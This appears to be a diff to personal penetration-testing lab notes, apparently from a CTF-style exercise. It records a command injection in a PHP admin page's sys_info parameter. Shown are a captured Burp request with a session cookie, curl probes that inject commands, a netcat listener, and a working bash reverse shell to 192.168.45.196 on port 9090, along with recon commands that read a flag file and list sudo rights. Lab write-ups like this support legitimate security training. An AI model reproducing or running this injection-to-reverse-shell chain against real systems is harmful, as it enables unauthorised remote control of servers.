@@ -59,3 +59,29 @@ now with command injection confirmed begin recon:
 |cat /var/www/local.txt
 
 |sudo -l
+
+
+##original working request from burp:
+POST /dev/admin.php HTTP/1.1
+Host: 192.168.181.121
+...SNIP...
+Referer: http://192.168.181.121/dev/admin.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=9b5888818e95f56ad058923ee9c38be9
+Connection: keep-alive
+
+sys_info=-h|ls
+
+##user a reverse shell
+##basic curl first
+curl -s "http://192.168.181.121/dev/admin.php" \
+  -H "Cookie: PHPSESSID=9b5888818e95f56ad058923ee9c38be9" \
+  --data-urlencode "sys_info=-h|whoami"
+  
+  
+##start listener
+nc -nlvp 9090
+##verified works
+  curl -s "http://192.168.181.121/dev/admin.php" \
+  -H "Cookie: PHPSESSID=9b5888818e95f56ad058923ee9c38be9" \
+  --data-urlencode "sys_info=-h|bash -c 'bash -i >& /dev/tcp/192.168.45.196/9090 0>&1'"
